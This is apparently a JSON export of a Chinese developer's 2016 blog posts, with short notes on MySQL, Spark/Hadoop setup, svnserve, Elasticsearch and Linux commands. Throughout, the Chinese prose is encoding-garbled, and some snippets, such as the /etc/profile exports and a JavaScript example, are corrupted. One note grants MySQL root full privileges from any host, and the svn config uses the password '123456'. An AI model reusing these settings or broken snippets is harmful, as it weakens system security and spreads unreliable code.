quit[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql","slug":"mysql","permalink":"https://wangxiuwen.github.io/tags/mysql/"}],"author":"wangxiuwen"},{"title":"mysql è¿œç¨‹ç™»å½•","slug":"history/tech/5953c73311a1d5578f3f9a66","date":"2016-05-29T04:04:27.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a66/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a66/","excerpt":"","text":"ç¼ºçœçŠ¶æ€ä¸‹ï¼Œmysqlçš„ç”¨æˆ·æ²¡æœ‰è¿œç¨‹è®¿é—®çš„æƒé™ã€‚ æ”¹è¡¨æ³•mysql -u root -p use mysql; update user set host = '%' where user = 'root'; select host, user from user; æˆæƒæ³•GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'WITH GRANT OPTIONï¼›//èµ‹äºˆä»»ä½•ä¸»æœºè®¿é—®æ•°æ®çš„æƒé™ FLUSH PRIVILEGESï¼›//ä¿®æ”¹ç”Ÿæ•ˆ GRANT ALL PRIVILEGES ON *.* TO 'myuser'@'%'IDENTIFIED BY 'mypassword' WITH GRANT OPTION; GRANT ALL PRIVILEGES ON *.* TO 'myuser'@'192.168.1.3'IDENTIFIED BY 'mypassword' WITH GRANT OPTION;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql","slug":"mysql","permalink":"https://wangxiuwen.github.io/tags/mysql/"}],"author":"wangxiuwen"},{"title":"å¸è½½ mysql å…ˆåˆ é™¤äº†/var/lib/mysql","slug":"history/tech/5953c4d0c2b92f5665eeda45","date":"2016-05-28T19:52:24.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda45/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda45/","excerpt":"","text":"åœºæ™¯æ˜¯ æƒ³å¸è½½é‡è£…mysqlï¼Œå…ˆåˆ é™¤äº†[quote]/var/lib/mysql[/quote]é¢„æƒ³çš„å¸è½½æ–¹å¼å¤±è´¥ï¼š[code]sudo apt-get remove mysql-server //å¸è½½[/code]æˆ–è€…[code]apt-get --purge remove mysql-server //é…ç½®æ–‡ä»¶å’Œè®¾ç½®ä¹‹ç±»çš„å…¨é¢åˆ é™¤[/code]éšåæ¸…ç†æ‰å¤šä½™çš„dependenceï¼š[code]apt-get autoremove[/code]ä¸”å†æ¬¡å®‰è£…æŠ¥é”™ï¼š[code]root@ubuntu-server:/home# apt-get install mysql-serveræ­£åœ¨è¯»å–è½¯ä»¶åŒ…åˆ—è¡¨â€¦ å®Œæˆæ­£åœ¨åˆ†æè½¯ä»¶åŒ…çš„ä¾èµ–å…³ç³»æ ‘æ­£åœ¨è¯»å–çŠ¶æ€ä¿¡æ¯â€¦ å®Œæˆæ‚¨å¯èƒ½éœ€è¦è¿è¡Œâ€œapt-get -f installâ€æ¥çº æ­£ä¸‹åˆ—é”™è¯¯ï¼šä¸‹åˆ—è½¯ä»¶åŒ…æœ‰æœªæ»¡è¶³çš„ä¾èµ–å…³ç³»ï¼šmysql-server-5.7 : é¢„ä¾èµ–: mysql-common (&gt;= 5.5) ä½†æ˜¯å®ƒå°†ä¸ä¼šè¢«å®‰è£…ä¾èµ–: mysql-client-5.7 (&gt;= 5.7.12-0ubuntu1) ä½†æ˜¯å®ƒå°†ä¸ä¼šè¢«å®‰è£…ä¾èµ–: mysql-common (&gt;= 5.6.22-1~) ä½†æ˜¯å®ƒå°†ä¸ä¼šè¢«å®‰è£…ä¾èµ–: mysql-server-core-5.7 (= 5.7.12-0ubuntu1) ä½†æ˜¯å®ƒå°†ä¸ä¼šè¢«å®‰è£…E: æœ‰æœªèƒ½æ»¡è¶³çš„ä¾èµ–å…³ç³»ã€‚è¯·å°è¯•ä¸æŒ‡æ˜è½¯ä»¶åŒ…çš„åå­—æ¥è¿è¡Œâ€œapt-get -f installâ€(ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªè§£å†³åŠæ³•)ã€‚[/code]ç½‘ä¸Šæœç´¢åˆ°ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼Œå¤±è´¥ï¼š[code]apt-get --fix-broken install[/code]æ­£ç¡®çš„æ–¹å¼ï¼šçœ‹ä¸€ä¸‹å“ªä¸€ä¸ªè½¯ä»¶å‡ºé—®é¢˜:[code]apt-get -f install[/code]2.å¸è½½ï¼Œå°è¯•ä½¿ç”¨sudo dpkg --force-depends --purge xxxx[code]sudo dpkg --force-depends --purge mysql-clientsudo dpkg --force-depends --purge mysql-client-5.7sudo dpkg --force-depends --purge mysql-client-core-5.7sudo dpkg --force-depends --purge mysql-commonsudo dpkg --force-depends --purge mysql-server-5.7[/code][quote]å¦‚æœé­é‡äº†æ²¡æœ‰å¸è½½å¹²å‡€æˆ–è€…ä¾èµ–å®‰è£…å‡ºç°é—®é¢˜ï¼Œä¼šå¯¼è‡´ä½ æ— è®ºæ€ä¹ˆé‡è£…éƒ½æŠ¥é”™å¤±è´¥ã€‚ä¼šæç¤ºä½ å®‰è£…ä¾èµ–æ–¹é¢çš„é—®é¢˜ï¼Œåœ¨è¿™ä¹‹åæ— è®ºä½ å®‰è£…åˆ«çš„å•¥ï¼Œéƒ½ä¼šæç¤ºä½ å½“å‰å®‰è£…è¿‡ä¸€ä¸ªä»€ä¹ˆä¸œè¥¿å®‰è£…å¤±è´¥äº†æ˜¯å› ä¸ºæŸäº›ä¾èµ–çš„é—®é¢˜ã€‚è¿™æ—¶å€™å°±éœ€è¦æ¸…ç†æ‰è¿™äº›é—®é¢˜é‡æ–°å®‰è£…ã€‚[/quote]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql","slug":"mysql","permalink":"https://wangxiuwen.github.io/tags/mysql/"}],"author":"wangxiuwen"},{"title":"spark ä»ä¸‹è½½åˆ° hello world","slug":"history/tech/5953c73311a1d5578f3f9a65","date":"2016-05-28T04:48:48.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a65/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a65/","excerpt":"","text":"Spark é‡‡ç”¨çš„æ˜¯ master/slave æ¶æ„ã€‚Spark å¯ä»¥è¿è¡Œåœ¨yarn mesos ç­‰èµ„æºç®¡ç†æ¡†æ¶ä¹‹ä¸Šï¼Œ ä¹Ÿå¯ä»¥ä»¥ Standalone cluster manager è¿›è¡Œé›†ç¾¤èµ„æºç®¡ç†ã€‚Spark ä¾èµ– Hadoop HDFS ä½œä¸ºæ•°æ®å­˜å‚¨ã€‚å¦‚æœæ˜¯çº¯è®¡ç®—é›†ç¾¤ï¼Œå¯ä»¥ä¸ä¾èµ–Hadoopã€‚Sparkæœ¬èº«çš„å¯åŠ¨è¿è¡Œæ˜¯ä¸ä¾èµ–Hadoopçš„ã€‚Sparké›†ç¾¤å¯ä»¥ä»¥ä¸‹æ–¹å¼è¿è¡Œï¼š[quote]ä¸»èŠ‚ç‚¹ (Spark master node å’Œ Hadoop NameNode)ä»èŠ‚ç‚¹ (Spark worker nodes å’Œ Hadoop DataNodes)å®¢æˆ·ç«¯ (Driver node)[/quote]ç”¨æˆ·çš„ driver program è¿è¡Œåœ¨ driver nodeä¸Šã€‚ä»¥ä¸‹æ˜¯Spark æ¶æ„å›¾ï¼šä»¥ ubuntu ä¸ºä¾‹ï¼š[code]root@qianrushi:/usr/local/spark-1.6.0-bin-hadoop2.6/conf# cat /etc/issueUbuntu 14.04.4 LTS \\n \\l[/code]é¦–å…ˆæˆ‘ä»¬éœ€è¦é…ç½®ä¸»æœºåç§°ï¼Œè¿™éœ€è¦é…ç½®ä¸¤ä¸ªæ–‡ä»¶ï¼š[quote]/etc/hosts[/quote][quote]/etc/hostname[/quote][code]root@qianrushi:/usr/local/spark-1.6.0-bin-hadoop2.6/conf# cat /etc/hostnameqianrushiroot@qianrushi:/usr/local/spark-1.6.0-bin-hadoop2.6/conf# cat /etc/hosts#127.0.0.1 localhost192.168.200.111 localhost192.168.200.111 qianrushi#127.0.1.1 localhost.localdomain localhost192.168.200.111 localhost.localdomain localhost[/code] [code]root@ubuntu-server:~# tail -n 10 /etc/profileexport JAVA_HOME=/usr/local/java/jdk1.8.0_91export JRE_HOME=JAVAHOME/jreexportCLASSPATH=.:JAVA_HOME/jre export CLASSPATH=.:JAVAâ€‹Hâ€‹â€‹OME/jreexportCLASSPATH=.:JAVA_HOME/lib/dt.jar:JAVAHOME/lib/tools.jarexportPATH=JAVA_HOME/lib/tools.jar export PATH=JAVAâ€‹Hâ€‹â€‹OME/lib/tools.jarexportPATH=JAVA_HOME/bin:$PATHexport SCALA_HOME=/usr/local/scalaexport PATH=PATH:PATH:PATH:SCALA_HOME/binexport HADOOP_HOME=/usr/local/hadoopexport PATH=PATH:PATH:PATH:HADOOP_HOME/bin[/code][code]//----------------------------------------------------------------core-site.xml&lt;configuration&gt;&lt;property&gt;&lt;name&gt;fs.defaultFS&lt;/name&gt;&lt;value&gt;hdfs://ubuntu-server:9011/&lt;/value&gt;&lt;/property&gt;&lt;property&gt;&lt;name&gt;hadoop.tmp.dir&lt;/name&gt;&lt;value&gt;file:/data/hadoop/tmp&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt;//----------------------------------------------------------------hadoop-env.shexport JAVA_HOME=/usr/local/java/jdk1.8.0_91//----------------------------------------------------------------hdfs-site.xml&lt;configuration&gt;&lt;property&gt;&lt;name&gt;dfs.namenode.secondary.http-address&lt;/name&gt;&lt;value&gt;ubuntu-server:9001&lt;/value&gt;&lt;/property&gt;&lt;property&gt;&lt;name&gt;dfs.namenode.name.dir&lt;/name&gt;&lt;value&gt;file:/data/hadoop/dfs/name&lt;/value&gt;&lt;/property&gt;&lt;property&gt;&lt;name&gt;dfs.datanode.data.dir&lt;/name&gt;&lt;value&gt;file:/data/hadoop/dfs/data&lt;/value&gt;&lt;/property&gt;&lt;property&gt;&lt;name&gt;dfs.replication&lt;/name&gt;&lt;value&gt;3&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt;å°†Hadoop.tmp.diræ‰€æŒ‡å®šçš„ç›®å½•åˆ é™¤ã€‚é‡æ–°æ‰§è¡Œå‘½ä»¤ï¼šhadoop namenode -formatåªæœ‰namenodeéœ€è¦formatï¼Œsecondarynamenodeå’Œdatanodeä¸éœ€è¦formatã€‚[/code]å¯ä»¥é€šè¿‡spark-shellåšç®€å•æµ‹è¯•ï¼š[quote]SPARK_EXECUTOR_MEMORY çš„å¤§å°ä¸èƒ½è¶…è¿‡èŠ‚ç‚¹å¯ç”¨å†…å­˜[/quote][code]SPARK_EXECUTOR_MEMORY=2g ./bin/spark-shell --master spark://master:7077[/code]æµ‹è¯•1:[code]scala&gt;val data = new ArrayIntscala&gt;for (i &lt;- 0 until data.length)| data(i) = i + 1scala&gt;val distData = sc.parallelize(data)scala&gt;distData.reduce(+)[/code]æµ‹è¯•2:å…ˆå°†æ–‡ä»¶ä¼ åˆ°hdfsä¸Šï¼š[code]root@qianrushi:~# cat test.txtabcdroot@qianrushi:~# hdfs dfs -ls /root@qianrushi:~# hdfs dfs -put test.txt /[/code]è¿›å…¥sparks-shellï¼š[code]scala&gt;val textFile = sc.textFile(&quot;hdfs://master:9000/test.txt&quot;)scala&gt;textFile.filter(line =&gt; line.contains(&quot;a&quot;)).count()[/code]sparkå®˜æ–¹æ–‡æ¡£æµ‹è¯• sparksqlï¼š[code]scala&gt;val sqlContext = new org.apache.spark.sql.SQLContext(sc)scala&gt;val df = sqlContext.read.json(&quot;examples/src/main/resources/people.json&quot;)scala&gt;df.show()scala&gt;df.printSchema()scala&gt;df.select(&quot;name&quot;).show()[/code]é»˜è®¤ç«¯å£ï¼š[quote]Hadoop NameNode 50070 http://&lt;Hadoop NameNode private IP&gt;:50070Spark master 8080 http://&lt;spark master private IP&gt;:8080[/quote]cankao:[quote]http://www.cnblogs.com/ringwang/p/3623149.htmlhttp://hsrong.iteye.com/blog/1374734http://www.ubuntukylin.com/ukylin/forum.php?mod=viewthread&amp;tid=4702http://blog.csdn.net/yeruby/article/details/21542465[/quote]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"spark","slug":"spark","permalink":"https://wangxiuwen.github.io/tags/spark/"}],"author":"wangxiuwen"},{"title":"pdf.js","slug":"history/tech/5953c4d0c2b92f5665eeda42","date":"2016-05-27T03:46:27.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda42/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda42/","excerpt":"","text":"[code]git clone git://github.com/mozilla/pdf.js.gitnpm installnode make generic/generic/web/viewer.html[/code]å¯ä»¥ä¼ é€’å‚æ•°[code]/generic/web/viewer.html?file=test.pdf[/code]å¢æ·»ä¸€ä¸ªphpæ–‡ä»¶åšè·³è½¬ï¼š[code]&lt;?phpheader(â€˜Location: /web/viewer.htmlâ€™);[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"front-end","slug":"front-end","permalink":"https://wangxiuwen.github.io/tags/front-end/"}],"author":"wangxiuwen"},{"title":"linux ä»¥æŸä¸ªç”¨æˆ·èº«ä»½æ‰§è¡Œ","slug":"history/tech/5953c4d0c2b92f5665eeda44","date":"2016-05-26T19:35:05.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda44/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda44/","excerpt":"","text":"[code]su username -c &quot;command&quot;[/code]ä¾‹å¦‚ï¼š[code]su elasticsearch -c &quot;/usr/local/elasticsearch/bin/elasticsearch -d&quot;[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"svnserve éƒ¨ç½²","slug":"history/tech/5953c4d0c2b92f5665eeda43","date":"2016-05-26T19:17:40.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda43/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda43/","excerpt":"","text":"å¯åŠ¨å‘½ä»¤ï¼šsvnserve -d -r /svn/ --config-file /svn/conf/svnserve.conf --log-file /var/log/svn/svn.log --pid-file /var/run/svn/svn.pid --listen-port 3690é…ç½®ï¼š/svn/conf/svnserve.confï¼š anon-access = none auth-access = read password-db = /svn/conf/passwd authz-db = /svn/conf/authz /svn/conf/authz: svn_group = admin [/] @svn_group = r /svn/conf/passwd: admin = 123456","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"svn","slug":"svn","permalink":"https://wangxiuwen.github.io/tags/svn/"}],"author":"wangxiuwen"},{"title":"elasticsearchæç¤ºParse Failure [No mapping found for [filed] in order to sort on]]çš„è§£å†³åŠæ³•","slug":"history/tech/5953c4d0c2b92f5665eeda41","date":"2016-05-23T19:17:58.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda41/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda41/","excerpt":"","text":"æ’åºä»£ç å¦‚ä¸‹:[code]{&quot;sort&quot;: [{&quot;@timestamp&quot;: {&quot;order&quot;: &quot;desc&quot;}}]}[/code]ç›´æ¥æŠ¥é”™[quote]Parse Failure [No mapping found for [filed] in order to sort on]][/quote]ä¿®æ”¹åçš„ä»£ç å¦‚ä¸‹:[code]{&quot;sort&quot;: [{&quot;@timestamp&quot;: {&quot;order&quot;: &quot;desc&quot;,&quot;ignore_unmapped&quot;: true}}]}[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"awk å‘½ä»¤","slug":"history/tech/5953c4d0c2b92f5665eeda40","date":"2016-05-23T03:18:41.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda40/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda40/","excerpt":"","text":"[code]awk â€˜{a[$2]=$0}â€™[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"unix ä¸‹æŸ¥çœ‹soæ–‡ä»¶ä¿¡æ¯","slug":"history/tech/5953c4d0c2b92f5665eeda3f","date":"2016-05-18T18:53:00.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda3f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda3f/","excerpt":"","text":"å¾ˆå¤šéå¸¸ç†Ÿæ‚‰windows è¿›ç¨‹ä¾èµ–é‚£ä¸ªdllï¼Œä½¿ç”¨dependsï¼Œlinuxä½¿ç”¨lddå‘½ä»¤ã€‚æŸ¥çœ‹å‡½æ•°windowsä½¿ç”¨dumpbinï¼Œlinuxä½¿ç”¨[code]objdump -tT libCavium4J.so |grep generateKeynm -D libCavium4J.so |grep generateKeyreadelf -a libdld.so[/code]lipo -infoå‘½ä»¤æŸ¥çœ‹.aåŒ…å±æ€§","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"mac çƒ§å†™ ubuntu uç›˜ å¯åŠ¨ç›˜","slug":"history/tech/5953c4d0c2b92f5665eeda3e","date":"2016-05-15T04:41:30.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda3e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda3e/","excerpt":"","text":"å°†ISOè½¬æ¢æˆIMG:[code]hdiutil convert -format UDRW -o ubuntu-16.04-desktop-amd64.img ubuntu-16.04-desktop-amd64.iso[/code]æŸ¥çœ‹ç£ç›˜è®¾å¤‡åï¼Œæ‰¾åˆ°Uç›˜çš„è®¾å¤‡å[code]diskutil list[/code]å¸è½½Uç›˜[code]diskutil umountDisk /dev/disk2[/code]ä½¿ç”¨ddå°†ubuntuçš„imgå†™å…¥Uç›˜[code]sudo dd if=ubuntu-16.04-desktop-amd64.dmg of=/dev/disk2 bs=1m[/code]å®Œæˆï¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mac","slug":"mac","permalink":"https://wangxiuwen.github.io/tags/mac/"}],"author":"wangxiuwen"},{"title":"ç¡¬ä»¶å·¥ç¨‹å¸ˆåŸ¹è®­æ•™æ.pdf","slug":"history/tech/5953c4d0c2b92f5665eeda3d","date":"2016-05-13T03:46:45.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda3d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda3d/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"ç¡¬ä»¶è®¾è®¡","slug":"ç¡¬ä»¶è®¾è®¡","permalink":"https://wangxiuwen.github.io/tags/%E7%A1%AC%E4%BB%B6%E8%AE%BE%E8%AE%A1/"}],"author":"wangxiuwen"},{"title":"mongodbå®æˆ˜pdf","slug":"history/tech/5953c4d0c2b92f5665eeda3c","date":"2016-05-13T00:05:40.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda3c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda3c/","excerpt":"","text":"mongodbå®æˆ˜pdfï¼šmongodbå®æˆ˜","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"nodejså­—ç¬¦ä¸²ä¸­æ‰¾æ•°å­—","slug":"history/tech/5953c4d0c2b92f5665eeda3b","date":"2016-05-12T04:07:09.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda3b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda3b/","excerpt":"","text":"[code]var str = â€˜abc123def345â€™;var args = ;str = str.replace(/\\d+/g, function(){console.log(arguments);args.push(Number(arguments[0]));});console.log(args);[/code]å¾—åˆ°ç»“æœï¼š[code]/usr/local/bin/node test.js{ â€˜0â€™: â€˜123â€™, â€˜1â€™: 3, â€˜2â€™: â€˜abc123def345â€™ }{ â€˜0â€™: â€˜345â€™, â€˜1â€™: 9, â€˜2â€™: â€˜abc123def345â€™ }[ 123, 345 ][/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"asyncå‚æ•°ä½ç½®","slug":"history/tech/5953c4d0c2b92f5665eed973","date":"2016-05-12T03:57:00.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed973/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed973/","excerpt":"","text":"ä»Šå¤©è°ƒè¯•nodejsä»£ç ï¼Œä¸€ç›´æŠ¥ cb is not a functionï¼ŒæŸ¥é˜…å®˜æ–¹æ–‡æ¡£ï¼ŒåŸæ¥æ˜¯async æ–°ç‰ˆæœ¬(â€œasyncâ€: â€œ^2.0.0-rc.4â€,)å°†cbå‚æ•°æŒªåˆ°äº†åé¢ï¼š[code]async.auto({// this function will just be passed a callbackreadData: async.apply(fs.readFile, â€˜data.txtâ€™, â€˜utf-8â€™)showData: [â€˜readDataâ€™, function (results, cb) {// results.readData is the fileâ€™s contents// â€¦}]}, callback);[/code]å°†ä»£ç å‚æ•°äº’æ¢ï¼Œé—®é¢˜è§£å†³ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"git æš‚å­˜åŒº","slug":"history/tech/5953c4d0c2b92f5665eeda0e","date":"2016-05-10T04:03:01.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda0e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda0e/","excerpt":"","text":"å½“ä½ æ­£åœ¨å†™æ¥å£Aï¼Œ åŒäº‹è¿‡æ¥è¯·ä½ ä¿®æ”¹bug Bï¼Œ è¿™æ—¶ï¼Œ å¯ä»¥[code] git stash[/code]å°†ç°åœ¨çš„æœ¬åœ°ä¿®æ”¹æš‚å­˜ä¸‹æ¥ï¼Œæ¥ç€ä¿®æ”¹ bug Bï¼Œ å°†bug B æäº¤ä»¥åï¼Œ å¯ä»¥[code]git stash pop[/code]å°†ä¿®æ”¹æ‹‰å‡ºæ¥ æ¥ç€å¼€å‘æ¥å£Aã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"Numpyä¸­ä½¿ç”¨loadtxtè·å–å•ä¸€åˆ—æ•°æ®æ—¶è®¾ç½®usecolså‚æ•°çš„æ–¹æ³•","slug":"history/tech/5953c73311a1d5578f3f9a64","date":"2016-05-08T17:10:13.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a64/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a64/","excerpt":"","text":"loadtxtçš„åŠŸèƒ½æ˜¯è¯»å…¥æ•°æ®æ–‡ä»¶ï¼Œè¿™é‡Œçš„æ•°æ®æ–‡ä»¶è¦æ±‚æ¯ä¸€è¡Œæ•°æ®çš„æ 